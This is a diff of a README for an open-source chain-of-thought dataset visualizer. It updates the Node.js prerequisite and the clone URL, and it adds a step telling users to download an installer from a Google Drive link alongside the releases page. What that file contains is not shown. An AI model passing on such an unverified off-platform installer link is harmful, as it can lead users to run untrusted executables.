@@ -15,12 +15,13 @@ Chain-of-Thought Dataset Visualizer is an open-source application designed to fa
 
 ### Prerequisites
 
-- Ensure you have Node.js and npm installed on your system. You can download them from [nodejs.org](https://nodejs.org/).
+- Ensure you have Node.js Latest and npm installed on your system. You can download them from [nodejs.org](https://nodejs.org/).
 
 ### Steps to Install
 
 1. **Download the Application**:
    - Visit the [releases page](https://github.com/your-repo/chain-of-thought-visualizer/releases) and download the appropriate installer for your operating system.
+   - Visti the [Drive Package](https://drive.google.com/file/d/1xPTOttz42VG6CXTiuLYBfC6V0nZncp2f/view?usp=drive_link) and download the appropriate installer for your operating system.
 
 2. **Install the Application**:
    - **Windows**: Run the downloaded `.exe` file and follow the on-screen instructions to complete the installation.
@@ -33,8 +34,8 @@ If you are a developer and wish to modify the application's code or run it in a 
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/your-repo/chain-of-thought-visualizer.git
-   cd chain-of-thought-visualizer
+   git clone https://github.com/luisagreda-aidev/Dataset-CoT-Visualizer.git
+   cd Dataset-CoT-Visualizer
    ```
 
 2. **Install Dependencies**:
